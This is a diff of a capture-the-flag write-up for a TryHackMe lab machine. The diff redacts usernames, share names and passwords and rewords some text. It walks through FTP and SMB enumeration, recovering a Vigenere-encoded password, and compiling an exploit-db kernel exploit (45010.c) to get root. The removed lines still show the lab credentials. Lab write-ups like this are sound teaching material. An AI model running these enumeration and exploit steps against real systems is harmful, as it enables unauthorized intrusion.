@@ -67,17 +67,17 @@ Host script results:
 
 ## FTP :
 
-login to FTP we get a directory `/pub`, inside it a picture and a hidden directory  :
+login to FTP we get a directory `/pub`, Enumerate it to get some juicy stuff :
 ```
 bvr0n@kali:~/CTF/THM/NerdHerd_v2$ ncftp 10.10.203.70
 ncftp /pub > ls -la
-drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .jokesonyou
+drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .*****onyou
 -rw-rw-r--    1 ftp      ftp         89894 Sep 11 03:45 youfoundme.png
 ncftp /pub > cd .jokesonyou   
-ncftp /pub/.jokesonyou > ls
+ncftp /pub/.*****onyou > ls
 hellon3rd.txt
 ```
-running exiftoot on the image we get this :
+After grabbing the image, i ran exiftoot on it and got this, This we'll use later :
 ```
 Owner Name                      : fijbxslz
 ```
@@ -114,10 +114,10 @@ bvr0n@kali:~/CTF/THM/NerdHerd_v2$ smbclient --no-pass -L 10.10.203.70
 Sharename       	        Type      Comment
 ---------       	        ----      -------
 print$          	        Disk      Printer Drivers
-nerdherd_classified 	    	Disk      Samba on Ubuntu
+********_********** 	    	Disk      Samba on Ubuntu
 IPC$            	        IPC       IPC Service (nerdherd server (Samba, Ubuntu))
 ```
-I tried accessing the `nerdherd_classified` but we need a valid user to login with, so i tried this :
+I tried accessing the `********_**********` but we need a valid user to login with, so i tried this :
 ```
 bvr0n@kali:~/CTF/THM/NerdHerd_v2$ enum4linux 10.10.203.70
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  6 14:06:12 2020
@@ -136,20 +136,20 @@ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 |    Users on 10.10.203.70    |
  ============================= 
 
-index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc: 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: *****    Name: ChuckBartowski    Desc: 
 
 user:[chuck] rid:[0x3e8]
 ```
 
-Looks like user `chuck` have access to the shared folder, i tried accessing it with the creds i got earlier, but nothing!! so i asked the author!! this one `fijbxslz` was `Vigenere
+Looks like user `*****` have access to the shared folder, i tried accessing it with the creds i got earlier, but nothing!! so i asked the author!! this one `fijbxslz` was `Vigenere
 Cipher` ! And the key to decrypt it is the youtube title we got earlier :
 ```
-Key : birdistheword
-Password : easypass
+Key : ****istheword
+Password : ****pass
 ```
 ```
-bvr0n@kali:~/CTF/THM/NerdHerd_v2$ smbclient -U chuck //10.10.203.70/nerdherd_classified
-Enter WORKGROUP\chuck's password: 
+bvr0n@kali:~/CTF/THM/NerdHerd_v2$ smbclient -U ***** //10.10.203.70/********_**********
+Enter WORKGROUP\*****'s password: 
 smb: \> dir
   secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020
 ```
@@ -171,9 +171,9 @@ I searched for it and i found this [Exploit](https://www.exploit-db.com/exploits
 I downloaded the exploit into my machine and transferred it to the victims machine :
 
 ```
-chuck@nerdherd:~$ gcc 45010.c -o exploit
-chuck@nerdherd:~$ chmod +x exploit 
-chuck@nerdherd:~$ ./exploit 
+*****@nerdherd:~$ gcc 45010.c -o exploit
+*****@nerdherd:~$ chmod +x exploit 
+*****@nerdherd:~$ ./exploit 
 root@nerdherd:~# id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
 ```
